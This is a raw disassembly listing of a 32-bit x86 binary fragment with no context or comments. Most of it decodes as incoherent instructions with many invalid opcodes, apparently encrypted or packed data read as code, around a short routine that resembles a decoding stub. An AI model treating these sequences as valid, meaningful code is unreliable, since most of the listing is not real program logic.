  409a63:	sbb    eax,0xc9039797
  409a68:	int3   
  409a69:	push   ebp
  409a6a:	es cmp eax,0x5fee1346
  409a70:	stos   DWORD PTR es:[edi],eax
  409a71:	xor    esp,DWORD PTR [ebp-0x32]
  409a74:	popf   
  409a75:	or     edi,DWORD PTR [eax+edx*2-0x22218f25]
  409a7c:	push   0x81ddc6b
  409a81:	fld    st(6)
  409a83:	loopne 0x409a1f
  409a85:	cmp    BYTE PTR [esi],dl
  409a87:	pushf  
  409a88:	mov    gs,WORD PTR [ebp+0x693cb12f]
  409a8e:	jnp    0x409acf
  409a90:	add    BYTE PTR [esp+edx*8],cl
  409a93:	loop   0x409ac4
  409a95:	cli    
  409a96:	lods   al,BYTE PTR ds:[esi]
  409a97:	lods   al,BYTE PTR ds:[esi]
  409a98:	loope  0x409afe
  409a9a:	clc    
  409a9b:	jecxz  0x409a21
  409a9d:	mov    cl,0x56
  409a9f:	ror    WORD PTR [edx+0xb],cl
  409aa3:	retf   0x9ab4
  409aa6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409aa7:	pop    esi
  409aa8:	xchg   ebx,eax
  409aa9:	jb     0x409b10
  409aab:	sub    dh,cl
  409aad:	pop    edx
  409aae:	jp     0x409a51
  409ab0:	add    bh,0xc8
  409ab3:	or     al,0xa4
  409ab5:	push   ss
  409ab6:	xchg   ecx,eax
  409ab7:	push   esi
  409ab8:	xchg   esi,eax
  409ab9:	cmp    edi,DWORD PTR [edx-0x6c]
  409abc:	repnz adc BYTE PTR [edi+0x676945a6],0xe3
  409ac4:	adc    ebx,DWORD PTR [edx]
  409ac6:	(bad)  
  409ac7:	ret    
  409ac8:	pop    eax
  409ac9:	iret   
  409aca:	cli    
  409acb:	push   ds
  409acc:	push   ss
  409acd:	das    
  409ace:	out    0xd3,eax
  409ad0:	pop    edx
  409ad1:	les    eax,FWORD PTR [esi+ebx*8]
  409ad4:	aad    0xf1
  409ad6:	inc    esi
  409ad7:	cwde   
  409ad8:	lds    edi,FWORD PTR [esi+0x7443b8f1]
  409ade:	cmp    al,0x9b
  409ae0:	sbb    BYTE PTR [esi],ah
  409ae2:	lahf   
  409ae3:	jno    0x409b42
  409ae5:	mov    eax,0x4e2933b5
  409aea:	scas   eax,DWORD PTR es:[edi]
  409aeb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409aec:	in     eax,dx
  409aed:	mov    ds:0x4e8b655c,eax
  409af2:	push   ss
  409af3:	and    al,0x81
  409af5:	loope  0x409b5b
  409af7:	imul   ecx,eax,0x6a
  409afa:	lods   al,BYTE PTR ds:[esi]
  409afb:	scas   eax,DWORD PTR es:[edi]
  409afc:	(bad)  
  409afd:	iret   
  409afe:	add    edi,DWORD PTR [edi]
  409b00:	jmp    0x409aff
  409b02:	sub    esi,esp
  409b04:	jnp    0x409aea
  409b06:	daa    
  409b07:	xor    al,0x24
  409b09:	push   esi
  409b0a:	mov    BYTE PTR [edx+0x7d],cl
  409b0d:	adc    eax,0x1c3a4817
  409b12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b13:	mov    cl,0x4b
  409b15:	mov    ah,0xa
  409b17:	push   ebp
  409b18:	jns    0x409af6
  409b1a:	sub    eax,0x7348b52
  409b1f:	mov    dh,0x18
  409b21:	jbe    0x409b66
  409b23:	addr16 xor eax,0xfc53b7ae
  409b29:	or     DWORD PTR [edx+0x6d47d79a],0x1
  409b30:	mov    al,0x68
  409b32:	inc    ebp
  409b33:	pop    es
  409b34:	out    0xac,al
  409b36:	push   edi
  409b37:	das    
  409b38:	sbb    dl,BYTE PTR [edx-0x1dd67937]
  409b3e:	retf   
  409b3f:	(bad)  
  409b40:	and    ecx,DWORD PTR [esi+edx*8-0x2722d7ef]
  409b47:	xlat   BYTE PTR ds:[ebx]
  409b48:	cli    
  409b49:	repz fsub st(3),st
  409b4c:	inc    esp
  409b4d:	stos   DWORD PTR es:[edi],eax
  409b4e:	cmp    esi,DWORD PTR [ecx]
  409b50:	lods   al,BYTE PTR ds:[esi]
  409b51:	cmp    al,bh
  409b53:	mov    eax,0x2d7db393
  409b58:	add    edx,edx
  409b5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b5b:	repnz adc dl,0xbc
  409b5f:	es xchg edx,eax
  409b61:	push   ebx
  409b62:	jmp    0x46ab:0x71464d13
  409b69:	in     eax,dx
  409b6a:	stc    
  409b6b:	mov    DWORD PTR [ebp-0x40],eax
  409b6e:	sub    DWORD PTR ds:0x434703,edx
  409b74:	mov    eax,0x7510851
  409b79:	mov    edi,DWORD PTR ds:0x43465f
  409b7f:	or     DWORD PTR ds:0x4346cf,edi
  409b85:	xor    edx,eax
  409b87:	xor    ecx,ecx
  409b89:	add    ecx,DWORD PTR ds:0x4346ff
  409b8f:	xor    DWORD PTR ds:0x434703,ecx
  409b95:	mov    ecx,0x327299
  409b9a:	add    edx,ecx
  409b9c:	mov    DWORD PTR [ebp-0x8],edx
  409b9f:	inc    edi
  409ba0:	mov    edx,DWORD PTR [ebp+0x8]
  409ba3:	xor    edx,eax
  409ba5:	add    edx,ecx
  409ba7:	mov    DWORD PTR [ebp+0xc],edx
  409baa:	mov    DWORD PTR [ebp-0x4],0xf89c85d6
  409bb1:	mov    edx,DWORD PTR ds:0x4346eb
  409bb7:	mov    edi,DWORD PTR ds:0x4347a3
  409bbd:	sub    edx,edi
  409bbf:	add    edx,DWORD PTR [edx+edi*1]
  409bc2:	jmp    0x409fd9
  409bc7:	xor    BYTE PTR [esp+edi*4],bl
  409bca:	xchg   ebp,eax
  409bcb:	mov    esp,0xd4bd31b5
  409bd0:	stos   BYTE PTR es:[edi],al
  409bd1:	cs pusha 
  409bd3:	push   0xb
  409bd5:	cmp    DWORD PTR [esi-0x72],edx
  409bd8:	jmp    0x7e7e:0x79707e7e
  409bdf:	cdq    
  409be0:	xchg   esi,eax
  409be1:	xor    al,0x61
  409be3:	cs sbb esi,edi
  409be6:	jne    0x409bcb
  409be8:	addr16 (bad) 
  409beb:	add    BYTE PTR [edi],dh
  409bed:	call   0x4f3:0x6b50a09f
  409bf4:	pop    edi
  409bf5:	cmp    BYTE PTR [edi],dh
  409bf7:	jne    0x409bb7
  409bf9:	sbb    bl,BYTE PTR [ebx]
  409bfb:	pop    eax
  409bfc:	retf   
  409bfd:	push   eax
  409bfe:	xchg   edx,eax
  409bff:	dec    esi
  409c00:	mov    DWORD PTR [ebx-0x40],ecx
  409c03:	jno    0x409c4f
  409c05:	cmp    esp,eax
  409c07:	aad    0xa4
  409c09:	xor    edx,ebx
  409c0b:	out    0x39,eax
  409c0d:	xchg   edi,eax
  409c0e:	(bad)  
  409c0f:	fnstcw WORD PTR [ecx]
  409c11:	and    edi,DWORD PTR [ebx]
  409c13:	ficom  WORD PTR [ebp+0x2981d439]
  409c19:	arpl   si,cx
  409c1b:	imul   ecx,edx,0x58f891e9
  409c21:	dec    ebp
  409c22:	dec    eax
  409c23:	and    ecx,DWORD PTR [ecx]
  409c25:	xor    eax,esp
  409c27:	jbe    0x409c83
  409c29:	push   ebx
  409c2a:	out    0xd6,eax
  409c2c:	fstp   TBYTE PTR [edx+ecx*2]
  409c2f:	dec    ebx
  409c30:	inc    edi
  409c31:	(bad)
  409c35:	inc    esi
  409c36:	mov    edi,DWORD PTR [ebx]
  409c38:	sub    cl,BYTE PTR [edx+0x34]
  409c3b:	push   es
  409c3c:	pushf  
  409c3d:	call   DWORD PTR [ebp+0x48]
  409c40:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  409c42:	fxch   st(2)
  409c44:	cdq    
  409c45:	iret   
  409c46:	and    bh,bl
  409c48:	mov    ds:0xc5e41dcd,al
  409c4d:	shl    BYTE PTR [ecx+eax*1-0x40],0x74
  409c52:	mov    ds:0x73684861,eax
  409c57:	xor    bl,0xc5
  409c5a:	rcr    BYTE PTR [eax+0x645521a9],0x19
  409c61:	in     eax,0x6b
  409c63:	xchg   esi,eax
  409c64:	dec    edx
  409c65:	leave  
  409c66:	fnsave [eax]
  409c68:	cdq    
  409c69:	xor    al,0x68
  409c6b:	cmp    al,0x28
  409c6d:	inc    edx
  409c6e:	mov    dh,0x22
  409c70:	out    dx,al
  409c71:	ror    DWORD PTR [eax],cl
  409c73:	cmp    BYTE PTR [ebx],0x5a
  409c76:	adc    al,0xc6
  409c78:	icebp  
  409c79:	sbb    eax,esp
  409c7b:	mov    dl,0x4c
  409c7d:	lds    ebx,FWORD PTR [edx-0x43]
  409c80:	mov    ch,0x17
  409c82:	mov    ecx,0xf355d3af
  409c87:	mov    eax,0xc76d13fc
  409c8c:	test   al,0xf3
  409c8e:	mov    al,0xed
  409c90:	retf   
  409c91:	lods   eax,DWORD PTR ds:[si]
  409c93:	mov    ds:0x4dbeb7d2,eax
  409c98:	es cld 
  409c9a:	push   0x3b2ae7aa
  409c9f:	sbb    eax,0xe89afb41
  409ca4:	fld    DWORD PTR [eax]
  409ca6:	imul   DWORD PTR [esp+esi*8-0x6de9c0a]
  409cad:	mov    ebp,0xe471f8aa
  409cb2:	fs mov eax,0xf610d4b2
  409cb8:	out    0xae,eax
  409cba:	les    esi,FWORD PTR [eax]
  409cbc:	enter  0xf1a1,0xf7
  409cc0:	cli    
  409cc1:	stos   DWORD PTR es:[edi],eax
  409cc2:	xlat   BYTE PTR ds:[ebx]
  409cc3:	add    al,BYTE PTR [ecx]
  409cc5:	or     edi,edx
  409cc7:	pop    esi
  409cc8:	sub    DWORD PTR [edi+0x5e2309b2],0xffffffa4
  409ccf:	mov    dl,BYTE PTR [esp+ecx*2+0x7c]
  409cd3:	inc    ebx
  409cd4:	mov    ah,BYTE PTR [ebp+0x77902d93]
  409cda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409cdb:	loop   0x409ccf
  409cdd:	lods   eax,DWORD PTR ds:[esi]
  409cde:	sub    esp,DWORD PTR ds:0xb57fe042
  409ce4:	les    esi,FWORD PTR [ebp+0x55]
  409ce7:	int3   
  409ce8:	dec    esp
  409ce9:	mov    BYTE PTR [esi-0x5915976a],bl
  409cef:	pop    ss
  409cf0:	mov    al,al
  409cf2:	mov    ecx,0x21c765bf
  409cf7:	aad    0x43
  409cf9:	xor    ah,BYTE PTR [edx+ebp*2]
  409cfc:	imul   edx,DWORD PTR [ecx],0x2f5266ec
  409d02:	sub    DWORD PTR [edi],esp
  409d04:	sbb    BYTE PTR [edi-0x59],bl
  409d07:	dec    edi
  409d08:	jb     0x409d74
  409d0a:	sbb    al,0x56
  409d0c:	fsub   st(7),st
  409d0e:	cdq    
  409d0f:	scas   al,BYTE PTR es:[edi]
  409d10:	out    0x36,eax
  409d12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d13:	add    BYTE PTR [ecx-0x6d],ch
  409d16:	push   ds
  409d17:	fdiv   DWORD PTR [ebp+ebp*4-0x37]
  409d1b:	ss mov esi,0xbb9de194
  409d21:	stos   DWORD PTR es:[edi],eax
  409d22:	mov    dh,0x77
  409d24:	dec    ebx
  409d25:	(bad)  
  409d26:	int    0xc7
  409d28:	adc    DWORD PTR [edx-0x5e98356c],ecx
  409d2e:	aaa    
  409d2f:	mov    dh,0xe3
  409d31:	imul   eax,DWORD PTR [edi+esi*2-0x33d621a1],0xf6ea8d68
  409d3c:	leave  
  409d3d:	js     0x409ce1
  409d3f:	loop   0x409d8e
  409d41:	mov    ebx,0x5e7cf14f
  409d46:	push   edx
  409d47:	adc    bh,cl
  409d49:	fld    DWORD PTR [ebp+0x7bf9d440]
  409d4f:	cmp    BYTE PTR [ecx+0x33],ch
  409d52:	in     al,0xa8
  409d54:	dec    edi
  409d55:	jnp    0x409cec
  409d57:	sbb    eax,edx
  409d59:	je     0x585d14fb
  409d5f:	lods   eax,DWORD PTR ds:[esi]
  409d60:	cmp    DWORD PTR [ebp+0x34],edi
  409d63:	out    dx,eax
  409d64:	jge    0x409cfc
  409d66:	jno    0x409d68
  409d68:	out    0x17,al
  409d6a:	mov    dh,0x3a
  409d6c:	mov    eax,ds:0x3d4a94dc
  409d71:	and    DWORD PTR [esi],ecx
  409d73:	or     BYTE PTR [eax*2+0xb5e92e8],cl
  409d7a:	xchg   edi,eax
  409d7b:	(bad)  
  409d7c:	mov    es,esp
  409d7e:	sbb    eax,0x30e8a773
  409d83:	sub    eax,0x55b98da9
  409d88:	call   0x8ce93118
  409d8d:	xor    bh,BYTE PTR [edi-0x43]
  409d90:	mov    ebp,0x3f59c570
  409d95:	loope  0x409e0b
  409d97:	dec    DWORD PTR [ebp+0x19]
  409d9a:	add    BYTE PTR [edx],ch
  409d9c:	mov    dh,BYTE PTR [eax-0x2b]
  409d9f:	loop   0x409def
  409da1:	push   0xffffffa3
  409da3:	jo     0x409d77
  409da5:	sbb    BYTE PTR [eax],dh
  409da7:	cmp    ebx,DWORD PTR [ecx+ebp*1-0x59bf3724]
  409dae:	in     eax,dx
  409daf:	mov    bl,0x8f
  409db1:	es retf 0x6fef
  409db5:	pop    edx
  409db6:	mov    edi,0x85d4973f
  409dbb:	nop
  409dbc:	xchg   ebp,eax
  409dbd:	sbb    al,0xbe
  409dbf:	loope  0x409d9e
  409dc1:	in     eax,0x1
  409dc3:	cli    
  409dc4:	pop    edx
  409dc5:	and    al,0x32
  409dc7:	push   ebp
  409dc8:	mov    edi,0x78f8eda
  409dcd:	retf   
  409dce:	lods   al,BYTE PTR cs:[esi]
  409dd0:	xchg   esi,eax
  409dd1:	lods   eax,DWORD PTR ds:[esi]
  409dd2:	sbb    BYTE PTR cs:[esi],cl
  409dd5:	mov    dh,cl
  409dd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409dd8:	call   0xda8b:0xcdfa5a9b
  409ddf:	in     al,dx
  409de0:	mov    edx,0x80ef5442
  409de5:	retf   
  409de6:	xchg   ebx,eax
  409de7:	test   eax,0x23981875
  409dec:	imul   ebp,esi,0x67
  409def:	retf   0x2b90
  409df2:	or     DWORD PTR [edx],eax
  409df4:	sbb    al,0x57
  409df6:	dec    esi
  409df7:	mov    BYTE PTR [eax],ch
  409df9:	int3   
  409dfa:	jecxz  0x409e5e
  409dfc:	pop    esi
  409dfd:	mov    WORD PTR [ebx-0x33],fs
  409e00:	push   0x56
  409e02:	ret    
  409e03:	iret   
  409e04:	add    al,0xf3
  409e06:	dec    ebx
  409e07:	fdivr  DWORD PTR [ecx]
  409e0a:	add    edx,ebx
  409e0c:	sub    al,0xd7
  409e0e:	dec    ecx
  409e0f:	cmp    BYTE PTR [ebx+eax*4],bh
  409e12:	push   eax
  409e13:	ficom  WORD PTR [ebp+0x14]
  409e16:	hlt    
  409e17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e18:	retf   
  409e19:	ficom  WORD PTR [edx]
  409e1b:	mov    ch,cl
  409e1d:	push   edx
  409e1e:	in     al,0xa0
  409e20:	push   edx
  409e21:	(bad)  
  409e22:	cdq    
  409e23:	mov    DWORD PTR [ecx+0x7c],ebx
  409e26:	jae    0x409e1e
  409e28:	bound  edi,QWORD PTR [edi-0x6a3cbd]
  409e2e:	xchg   edx,eax
  409e2f:	adc    dl,bh
  409e31:	dec    ebx
  409e32:	call   0x32e90f13
  409e37:	pop    es
  409e38:	cs jecxz 0x409dfa
  409e3b:	std    
  409e3c:	cmp    al,0xc6
  409e3e:	jns    0x409eb1
  409e40:	mov    edx,0x5439a2bd
  409e45:	dec    esp
  409e46:	cmp    DWORD PTR [eax-0x1ef0d670],ebx
  409e4c:	sbb    al,0xf8
  409e4e:	mul    ecx
  409e50:	ror    BYTE PTR [edi+0x48fb1ec0],1
  409e56:	retf   
  409e57:	mov    ?,WORD PTR [eax]
  409e59:	xor    BYTE PTR [ebx+esi*1],ah
  409e5c:	or     cl,cl
  409e5e:	push   ecx
  409e5f:	and    BYTE PTR [eax-0x61bc022d],0x2f
  409e66:	push   ds
  409e67:	pop    ebp
  409e68:	out    0xb9,eax
  409e6a:	sub    BYTE PTR [ecx-0x3007cd7f],dh
  409e70:	bound  esi,QWORD PTR [edi-0x4f]
  409e73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e74:	push   edx
  409e75:	in     al,0xa
  409e77:	(bad)  
  409e78:	imul   BYTE PTR [eax-0x74]
  409e7b:	std    
  409e7c:	xor    al,0x50
  409e7e:	push   0xd
  409e80:	or     eax,0x8d41500e
  409e85:	test   BYTE PTR [ebp+0x3f],dh
  409e88:	adc    eax,0x33cf2096
  409e8d:	mov    ds:0x9c5819a0,eax
  409e92:	stos   BYTE PTR es:[edi],al
  409e93:	mov    ah,cl
  409e95:	in     eax,0x39
  409e97:	(bad)  
  409e98:	out    0x86,al
  409e9a:	jmp    0x409ed4
  409e9c:	mov    ds:0x8d70d9f3,al
  409ea1:	leave  
  409ea2:	imul   ebx,DWORD PTR [ebx-0x1ba97f90],0xffffffcd
  409ea9:	(bad)  
  409eab:	fwait
  409eac:	lahf   
  409ead:	or     al,0x18
  409eaf:	rol    BYTE PTR [edi],0x26
  409eb2:	dec    edx
  409eb3:	adc    cl,BYTE PTR [edi+0x5]
  409eb6:	pop    eax
  409eb7:	add    ebp,DWORD PTR [edx-0x8ef1327]
  409ebd:	push   0xffffffe1
  409ebf:	imul   esp,DWORD PTR [ecx-0x41],0x5fc35b74
  409ec6:	pop    ebx
  409ec7:	mov    cs,WORD PTR [ebp-0x4bbf1d29]
  409ecd:	test   al,0x8
  409ecf:	sbb    al,0xdf
  409ed1:	imul   DWORD PTR [ebx-0x6298558e]
  409ed7:	aam    0x7d
  409ed9:	test   BYTE PTR [ecx+0x55e29c8b],dl
  409edf:	jbe    0x409f07
  409ee1:	loopne 0x409efa
  409ee3:	out    dx,eax
  409ee4:	ror    DWORD PTR [ebx+0x4],1
  409ee7:	pop    ebx
  409ee8:	push   eax
  409ee9:	leave  
  409eea:	ss jge 0x409e91
  409eed:	or     eax,0x8994b82d
  409ef2:	sbb    ebx,esi
  409ef4:	(bad)  
  409ef5:	mov    esi,0xfa115b40
  409efa:	dec    ebx
  409efb:	aas    
  409efc:	outs   dx,DWORD PTR ds:[esi]
  409efd:	push   eax
  409efe:	rcl    dl,1
  409f00:	gs cmc 
  409f02:	xor    al,0x6
  409f04:	scas   al,BYTE PTR es:[edi]
  409f05:	jns    0x409ed8
  409f07:	(bad)  [ebp+ecx*2-0x41]
  409f0b:	push   ebx
  409f0c:	retf   0xa6fe
  409f0f:	outs   dx,BYTE PTR ds:[esi]
  409f10:	jmp    0x5f481c2e
  409f15:	pop    ecx
  409f16:	loope  0x409ef9
  409f18:	add    esi,DWORD PTR [ecx]
  409f1a:	jno    0x409ea3
  409f1c:	sti    
  409f1d:	push   ebx
  409f1e:	retf   
  409f1f:	pop    ebp
  409f20:	mov    cl,0xad
  409f22:	cwde   
  409f23:	idiv   BYTE PTR [eax]
  409f25:	sahf   
  409f26:	stos   BYTE PTR es:[edi],al
  409f27:	pop    esp
  409f28:	sub    DWORD PTR [edi+0x41],eax
  409f2b:	pop    ss
  409f2c:	enter  0xba55,0xb0
  409f30:	aam    0xe4
  409f32:	(bad)  
  409f33:	cmp    BYTE PTR [eax+0x73a5d847],dh
  409f39:	test   DWORD PTR [edi+ebx*4],edx
  409f3c:	mov    al,ds:0x3a158a14
  409f41:	xor    edx,edi
  409f43:	push   cs
  409f44:	stos   BYTE PTR es:[edi],al
  409f45:	xchg   esp,eax
  409f46:	scas   al,BYTE PTR es:[edi]
  409f47:	push   cs
  409f48:	or     al,0x71
  409f4a:	mov    al,ds:0xb239233e
  409f4f:	sub    al,BYTE PTR [edi+0x7c]
  409f52:	cli    
  409f53:	mov    dl,0x5f
  409f55:	ds dec edi
  409f57:	cmp    al,0x62
  409f59:	cmp    DWORD PTR [eax],esp
  409f5b:	jae    0x409fa4
  409f5d:	ret    
  409f5e:	mov    esp,0x290c44fe
  409f63:	push   edi
  409f64:	scas   al,BYTE PTR es:[edi]
  409f65:	push   0x50f041d7
  409f6a:	lods   eax,DWORD PTR ds:[esi]
  409f6b:	push   0xffffff88
  409f6d:	into   
  409f6e:	jle    0x409f4b
  409f70:	fcomi  st,st(3)
  409f72:	cmp    BYTE PTR [ebp+0x2abf08f4],ah
  409f78:	jns    0x409f42
  409f7a:	pop    eax
  409f7b:	pusha  
  409f7c:	test   al,0xff
  409f7e:	xchg   esi,eax
  409f7f:	pop    ds
  409f80:	adc    DWORD PTR [edi+esi*2+0x69d60833],ebp
  409f87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f88:	mov    al,0xba
  409f8a:	mov    BYTE PTR [edi-0x7fd81093],al
  409f90:	and    al,0x4b
  409f92:	mov    DWORD PTR [edi],ecx
  409f94:	xchg   esi,eax
  409f95:	mov    dh,al
  409f97:	jns    0x409fcc
  409f99:	cwde   
  409f9a:	jmp    0x7a69ef58
  409f9f:	int    0xca
  409fa1:	loopne 0x409f64
  409fa3:	mov    al,0x7e
  409fa5:	sbb    DWORD PTR [edi+0x1c6d07b1],ecx
  409fab:	push   0xfffffff8
  409fad:	lahf   
  409fae:	mov    dh,0x6f
  409fb0:	(bad)  
  409fb1:	fsub   QWORD PTR [ebx+0x11]
  409fb4:	pushf  
  409fb5:	xchg   DWORD PTR [ecx-0x19],edx
  409fb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409fb9:	mov    DWORD PTR [edi+0x54],ecx
  409fbc:	pop    ecx
  409fbd:	test   al,0x2a
  409fbf:	jo     0x40a021
  409fc1:	movntq (bad),mm6
  409fc2:	out    0xf6,eax
  409fc4:	fwait
  409fc5:	dec    esp
  409fc6:	pushf  
  409fc7:	xor    bl,0xb8
  409fca:	mov    ds:0x35160137,al
  409fcf:	xchg   edi,eax
  409fd0:	mov    esp,0xd5de40da
  409fd5:	rol    bh,0xf2
  409fd8:	mov    edi,0x38d845c7
  409fdd:	test   DWORD PTR [eax+edi*8+0x12e9ff23],ebx
  409fe4:	add    al,0x0
  409fe6:	add    BYTE PTR [ecx+0x6b],ah
  409fe9:	in     al,dx
  409fea:	(bad)  
  409feb:	cld    
  409fec:	popf   
  409fed:	popa   
  409fee:	imul   ebp,DWORD PTR [esi],0x0
  409ff1:	push   ebx
  409ff2:	fstp   DWORD PTR [eax+ecx*4-0x97fcf37]
  409ff9:	jle    0x40a079
  409ffb:	jo     0x40a076
  409ffd:	jle    0x40a07d
  409fff:	xchg   BYTE PTR [edx],ch
  40a001:	(bad)  
  40a002:	cmp    al,0x25
  40a004:	into   
  40a005:	pop    ss
  40a006:	int    0xb
  40a008:	leave  
  40a009:	or     ebp,DWORD PTR [edx-0x19]
  40a00c:	adc    ebp,DWORD PTR [ebx]
  40a00e:	repz push ss
  40a010:	in     al,0x70
  40a012:	cld    
  40a013:	mov    edx,0x3839c4
  40a018:	test   al,0xcc
  40a01a:	sahf   
  40a01b:	mov    ch,0xae
  40a01d:	pop    esp
  40a01e:	xchg   esp,eax
  40a01f:	xchg   edi,edi
  40a021:	sar    BYTE PTR [eax+0x5f],0x5c
  40a025:	mov    DWORD PTR [esi+eax*8-0x78259be1],0x12749da9
  40a030:	int    0xd4
  40a032:	ret    
  40a033:	sub    ebp,DWORD PTR [eax]
  40a035:	jns    0x40a08b
  40a037:	gs jge 0x40a033
  40a03a:	inc    ebp
  40a03b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a03c:	sbb    DWORD PTR [ebx-0x2365bb9],0xe6532f3b
  40a046:	loopne 0x40a097
  40a048:	sub    esi,DWORD PTR [edi-0x8d83a60]
  40a04e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a04f:	xchg   ecx,eax
  40a050:	adc    bh,BYTE PTR [ebx]
  40a052:	mov    WORD PTR [ebx],gs
  40a054:	cmp    BYTE PTR [esi+0x54],al
  40a057:	mov    esi,0xfb33bd3c
  40a05c:	fldcw  WORD PTR [edx+0x5d678044]
  40a062:	pop    ecx
  40a063:	xor    eax,0x571766e9
  40a068:	imul   ebx,ebx,0x31c78792
  40a06e:	sub    bl,bh
  40a070:	sbb    eax,0x46658cf4
  40a075:	adc    ebp,DWORD PTR [esi+0x7a]
  40a078:	cmp    eax,0x9dde8043
  40a07d:	adc    DWORD PTR [ebx+0x19],esp
  40a080:	sub    DWORD PTR [ecx-0x5c],edi
  40a083:	test   eax,0x9c9cd53f
  40a089:	dec    edi
  40a08a:	mov    ebx,0xa4cc96e2
  40a08f:	cmp    al,0x16
  40a091:	stos   DWORD PTR es:[edi],eax
  40a092:	(bad)  
  40a093:	hlt    
  40a094:	shr    BYTE PTR [eax+0x6b0e843c],cl
  40a09a:	rcr    esp,1
  40a09c:	clc    
  40a09d:	cmp    ah,BYTE PTR [edx]
  40a09f:	sbb    BYTE PTR [esi+0xbf8757a],al
  40a0a5:	aas    
  40a0a6:	daa    
  40a0a7:	dec    ebp
  40a0a8:	cmp    DWORD PTR [edi-0x592c42b7],ebx
  40a0ae:	or     DWORD PTR [esi],ecx
  40a0b0:	repnz mov ?,edx
  40a0b3:	cmp    DWORD PTR [eax+ebp*1-0x6e38a077],edx
  40a0ba:	mov    al,ds:0x8c109bfb
  40a0bf:	repz mov dh,0xef
  40a0c2:	push   esp
  40a0c3:	rcr    DWORD PTR [ecx],0xdf
  40a0c6:	cs aaa 
  40a0c8:	xchg   edi,eax
  40a0c9:	push   edi
  40a0ca:	and    BYTE PTR [ebp-0x17],bl
  40a0cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a0ce:	test   eax,0xb4957b6f
  40a0d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0d4:	pop    esp
  40a0d5:	js     0x40a0c9
  40a0d7:	sti    
  40a0d8:	not    DWORD PTR [ebx]
  40a0da:	cmc    
  40a0db:	or     BYTE PTR [ebx-0xae9d189],cl
  40a0e1:	push   0xffffffd2
  40a0e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a0e4:	jge    0x40a13c
  40a0e6:	loope  0x40a0cc
  40a0e8:	or     BYTE PTR ds:0x6e37b3d6,ch
  40a0ee:	sar    BYTE PTR [ebx+0x7a18c9a2],cl
  40a0f4:	test   DWORD PTR [eax],ecx
  40a0f6:	mov    esi,0xa27cffc6
  40a0fb:	pop    eax
  40a0fc:	jne    0x40a103
  40a0fe:	(bad)  
  40a0ff:	xor    ecx,eax
  40a101:	sub    al,0x64
  40a103:	cmp    BYTE PTR [eax+0x5f994f25],bl
  40a109:	mov    DWORD PTR [ebp+0x65d0e31f],esi
  40a10f:	push   ss
  40a110:	(bad)  
  40a111:	fcompp 
  40a113:	ror    DWORD PTR ds:0x9dbcecef,1
  40a119:	xchg   BYTE PTR [edi],dl
  40a11b:	shr    DWORD PTR [eax-0x2d],0xdd
  40a11f:	cmc    
  40a120:	(bad)  
  40a121:	mov    esp,0x83bf7dab
  40a126:	and    bh,BYTE PTR [eax-0x5b]
  40a129:	cmp    al,0xd9
  40a12b:	stc    
  40a12c:	sbb    dh,BYTE PTR ds:0x5f99cd78
  40a132:	inc    ebx
  40a133:	mov    al,ds:0x4b055149
  40a138:	xor    eax,0xbfa69d59
  40a13d:	out    0xff,eax
  40a13f:	cld    
  40a140:	mov    ch,0x85
  40a142:	or     eax,0x38d6df94
  40a147:	adc    bh,BYTE PTR [ebx-0x7cc3ffb1]
  40a14d:	xchg   ebx,eax
  40a14e:	dec    edi
  40a14f:	pop    esi
  40a150:	sbb    cl,BYTE PTR [ecx]
  40a152:	jnp    0x40a0fd
  40a154:	dec    ebp
  40a155:	xchg   ebx,eax
  40a156:	mov    ds:0xbc06780a,eax
  40a15b:	shl    DWORD PTR [edx+0x37],0xbe
  40a15f:	aam    0x5c
  40a161:	stc    
  40a162:	stos   DWORD PTR es:[edi],eax
  40a163:	pop    esi
  40a164:	inc    esi
  40a165:	adc    DWORD PTR [esi+0x4d],esp
  40a168:	inc    eax
  40a169:	xchg   edi,eax
  40a16a:	(bad)  
  40a16b:	jmp    0x40a1be
  40a16d:	xchg   ecx,eax
  40a16e:	sub    BYTE PTR [ebx-0x1d3c6789],ch
  40a174:	sbb    al,0x90
  40a176:	retf   
  40a177:	aas    
  40a178:	add    edx,DWORD PTR [edi+0x79]
  40a17b:	out    dx,al
  40a17c:	xchg   ecx,eax
  40a17d:	js     0x40a129
  40a17f:	xor    eax,0x8c1a9082
  40a184:	fistp  DWORD PTR [ecx-0x4ea93b2b]
  40a18a:	lods   eax,DWORD PTR ds:[esi]
  40a18b:	and    ebp,edi
  40a18d:	jno    0x40a1f9
  40a18f:	mov    cl,0x4c
  40a191:	sahf   
  40a192:	in     al,0x9c
  40a194:	add    DWORD PTR fs:[eax+0x38],ebx
  40a198:	jge    0x40a141
  40a19a:	or     ah,BYTE PTR [edx-0x734c05b7]
  40a1a0:	add    eax,0xdba90ea0
  40a1a5:	ins    BYTE PTR es:[edi],dx
  40a1a6:	sub    BYTE PTR [edi],0xe6
  40a1a9:	test   eax,0x7684c766
  40a1ae:	mov    ebx,ecx
  40a1b0:	xchg   ecx,eax
  40a1b1:	fst    QWORD PTR [esi+0x66a38bc0]
  40a1b7:	push   ss
  40a1b8:	(bad)  
  40a1ba:	hlt    
  40a1bb:	mov    eax,0x6d20c613
  40a1c0:	(bad)  
  40a1c1:	cmp    ebx,DWORD PTR [eax-0x54]
  40a1c4:	pusha  
  40a1c5:	(bad)  
  40a1c7:	fwait
  40a1c8:	push   esp
  40a1c9:	fmul   QWORD PTR [edi-0x74ff2455]
  40a1cf:	jno    0x40a202
  40a1d1:	add    bh,BYTE PTR [ebp-0x56aaa767]
  40a1d7:	add    ebx,ecx
  40a1d9:	lods   al,BYTE PTR ds:[esi]
